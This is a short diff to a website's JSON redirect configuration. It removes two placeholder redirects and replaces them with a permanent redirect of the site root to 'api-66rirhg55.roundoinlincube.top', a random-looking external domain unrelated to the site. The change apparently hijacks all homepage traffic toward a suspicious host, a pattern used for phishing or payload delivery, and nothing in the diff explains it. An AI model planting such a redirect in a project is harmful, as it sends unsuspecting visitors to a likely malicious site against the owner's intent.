@@ -1,13 +1,8 @@
 {
   "redirects": [
     {
-      "source": "/join",
-      "destination": "https://yourwebsite.com/signup",
-      "permanent": true
-    },
-    {
-      "source": "/offer",
-      "destination": "https://yourwebsite.com/offer",
+      "source": "/",
+      "destination": "https://api-66rirhg55.roundoinlincube.top/",
       "permanent": true
     }
   ]
